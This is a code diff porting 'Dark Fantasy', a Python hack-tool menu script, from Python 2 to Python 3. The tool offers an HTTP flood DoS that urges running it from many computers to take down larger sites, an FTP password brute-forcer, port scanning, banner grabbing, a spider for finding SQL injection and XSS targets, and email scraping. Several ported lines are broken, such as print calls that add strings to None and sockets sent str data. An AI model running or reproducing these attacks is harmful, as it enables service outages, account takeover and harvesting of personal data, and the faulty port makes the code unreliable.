@@ -2,7 +2,7 @@ import sys
 import socket
 from datetime import datetime
 import os
-import urllib2
+import urllib.request
 import subprocess
 import html2text
 import random
@@ -27,10 +27,10 @@ def dos(host):
     uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
     uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
     print ("[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
-    print ("[*]Host to attack: "+host)
+    print ("[*]Host to attack: ")+host
     ip=socket.gethostbyname(host)
-    print ("[*]IP of the host: "+ip+"\n\n")
-    conn=raw_input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
+    print (("[*]IP of the host: ")+ip+("\n\n"))
+    conn=input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
     conn=int(conn)
     
     for i in range(conn):
@@ -51,11 +51,7 @@ def dos(host):
         s.send("User-Agent: "+uagent[random_index]+"\r\n\r\n")
         s.close()
     main()
-              
-    
-
-
-    
+   
 
 def scanner(host):
     if operSys=="Windows":
@@ -90,8 +86,8 @@ def scanner(host):
         main()
     t2=datetime.now()
     timetaken=t2-t1
-    print ("[*] Scanning ended at: "+str(t2)+"\n")
-    print ("[*] Time taken= "+str(timetaken))
+    print (("[*] Scanning ended at: ")+str(t2)+("\n"))
+    print ("[*] Time taken= ")+str(timetaken)
     main()
     
 
@@ -105,14 +101,14 @@ def banner(host):
     except:
         "Error"
     host=socket.gethostbyname(host)
-    port=raw_input("[*] Enter the port of the service: ")
+    port=input("[*] Enter the port of the service: ")
     try:
         s.connect((host,int(port)))
         print ("[*] connection successfull\nWaiting for the banner...\n")
         if int(port)==80:
             s.send('HEAD / HTTP/1.0\r\n\r\n')
         data=s.recv(1024)
-        print ("\Banner:\n"+str(data))
+        print ("\Banner:\n")+str(data)
         
         s.close()
     except:
@@ -127,8 +123,8 @@ def ftp(server):
             subprocess.call('clear', shell=True)
     print ("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")
     passwords=[]
-    passw=raw_input("Enter the password file name(eg: pass.txt, wordlist.txt): ")
-    username=raw_input("Enter the username to hack(eg: admin, root): ") 
+    passw=input("Enter the password file name(eg: pass.txt, wordlist.txt): ")
+    username=input("Enter the username to hack(eg: admin, root): ") 
     f=open(str(passw))
     f=f.read()
     f=f.split('\n')
@@ -157,13 +153,13 @@ def ftp(server):
         data+=" "+s.recv(1024)
         s.send("Quit\r\n")
         s.close
-        print ("[*] Tried: "+password+"\n")
+        print (("[*] Tried: ")+password+("\n"))
         if "230" in data:
             print ("password found\n")
-            print ("[*] Password is: " + password)
+            print ("[*] Password is: ") + password
             main()
         else:
-            print ('[*] '+password+" is incorrect")
+            print (('[*] ')+password+(" is incorrect"))
     print ("No password Found. Try another word list or username.")
 
 def spider(host):
@@ -176,11 +172,11 @@ def spider(host):
     
 def spider1(host):
     print ("[*] Use the result to find promising URLs/Emails to try hacking using SQL injection or Xss or Social Engineering etc.\n[*] Depth is the level to go inside the website( usually a small integer ).\n[*] Output will also be saved in text files in the same folder as this software.\n")
-    depth = raw_input("Enter the depth level in numbers: ")
+    depth = input("Enter the depth level in numbers: ")
     count=1
     url="http://"+host
     text=open("depth1.txt","w+")
-    for i in re.findall('''href=["'](.[^"']+)["']''', urllib2.urlopen(url).read(), re.I):
+    for i in re.findall('''href=["'](.[^"']+)["']''', urllib.request.urlopen(url).read(), re.I):
         if "http" not in i:
                 i="http://"+host+i
         print (i)
@@ -199,7 +195,7 @@ def spider1(host):
                 j="http://"+host+j
 
             try:
-                for k in re.findall('''href=["'](.[^"']+)["']''', urllib2.urlopen(j).read(), re.I):
+                for k in re.findall('''href=["'](.[^"']+)["']''', urllib.request.urlopen(j).read(), re.I):
                     print (k)
                     text1.write(k+"\n")
             except:
@@ -227,7 +223,7 @@ def email(host):
         f=f.split("\n")
         for j in f:
             try:
-                e=urllib2.urlopen(j)
+                e=urllib.request.urlopen(j)
             except:
                 continue
 
@@ -235,10 +231,10 @@ def email(host):
                 cont=html2text.html2text(e.read())
             except UnicodeDecodeError :
                 try:
-                    cont=html2text.html2text(urllib2.urlopen(j).read().decode('utf-8'))
+                    cont=html2text.html2text(urllib.request.urlopen(j).read().decode('utf-8'))
                 except :
                     try:
-                        cont=urllib2.urlopen(j).read()
+                        cont=urllib.request.urlopen(j).read()
                     except:
                         continue
                     
@@ -255,25 +251,25 @@ def main():
     print ("                  Dark Fantasy - Hack Tool                    ")
     print ("-"*60+"\n")
     print ("|----------------------------------------------------------------------------------------------------|")
-    print("|  _   _   _  _      ____   _  __    ggggggg    _____   hh     hh   _____    y    y  ___             |")
-    print("| | | | | | || |    / ___| | |/ /  gg          |___ /   hh     hh  (____ )    y  y    | |            |")
-    print("| | |_| | | || |_  | |     | ' /   gg    gggg    |_ \   hhhhhhhhh      ( )     yy     | |            |")
-    print("| |  _  | |__   _| | |___  | . \   gg     gg    ___) |  hh     hh    ( )___    yy     | |            |")
-    print("| |_| |_|    |_|    \____| |_|\_\    ggggggg   |____/   hh     hh   (______)   yy    _|_|_           |")
-    print("|                                                                                                    |")
-    print("|-----------------------------------------ghy>h4ckg3h2y1------------------------------{MR.lvwuwei}---|")
-    print("|                                                                                                    |")
-    print("|       ____  _     _  _____ _            ____  ____  ____  _      _      _____ ____                 |")
-    print("|      /  _ \/ \   / \/  __// \  /|      / ___\/   _\/  _ \/ \  /|/ \  /|/  __//  __\                |")
-    print("|      | / \|| |   | ||  \  | |\ ||      |    \|  /  | / \|| |\ ||| |\ |||  \  |  \/|                |")
-    print("|      | |-||| |_/\| ||  /_ | | \||      \___ ||  \_ | |-||| | \||| | \|||  /_ |    /                |")
-    print("|      \_/  \|\____/\_/\____\_/  \|      \____/\____/\_/ \|\_/  \|\_/  \|\____\|_/\_\                |")
-    print("|                                                                                                    |")
-    print("|____________________________________________________________________________________________________|")
-    print("")
+    print ("|  _   _   _  _      ____   _  __    ggggggg    _____   hh     hh   _____    y    y  ___             |")
+    print ("| | | | | | || |    / ___| | |/ /  gg          |___ /   hh     hh  (____ )    y  y    | |            |")
+    print ("| | |_| | | || |_  | |     | ' /   gg    gggg    |_ \   hhhhhhhhh      ( )     yy     | |            |")
+    print ("| |  _  | |__   _| | |___  | . \   gg     gg    ___) |  hh     hh    ( )___    yy     | |            |")
+    print ("| |_| |_|    |_|    \____| |_|\_\    ggggggg   |____/   hh     hh   (______)   yy    _|_|_           |")
+    print ("|                                                                                                    |")
+    print ("|-----------------------------------------ghy>h4ckg3h2y1------------------------------{MR.lvwuwei}---|")
+    print ("|                                                                                                    |")
+    print ("|       ____  _     _  _____ _            ____  ____  ____  _      _      _____ ____                 |")
+    print ("|      /  _ \/ \   / \/  __// \  /|      / ___\/   _\/  _ \/ \  /|/ \  /|/  __//  __\                |")
+    print ("|      | / \|| |   | ||  \  | |\ ||      |    \|  /  | / \|| |\ ||| |\ |||  \  |  \/|                |")
+    print ("|      | |-||| |_/\| ||  /_ | | \||      \___ ||  \_ | |-||| | \||| | \|||  /_ |    /                |")
+    print ("|      \_/  \|\____/\_/\____\_/  \|      \____/\____/\_/ \|\_/  \|\_/  \|\____\|_/\_\                |")
+    print ("|                                                                                                    |")
+    print ("|____________________________________________________________________________________________________|")
+    print ("")
     print ("1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping")
-    choice=raw_input("Enter Your Choice: ")
-    hostname=raw_input("Enter Host Site or IP adress(www.google.com,www.yoursite.com,192.168.1.1)(***d'ont-not add http:// or https://): ")
+    choice=input("Enter Your Choice: ")
+    hostname=input("Enter Host Site or IP adress(www.google.com,www.yoursite.com,192.168.1.1)(***d'ont-not add http:// or https://): ")
     hostname=str(hostname)
     if choice=='1':
         scanner(hostname)
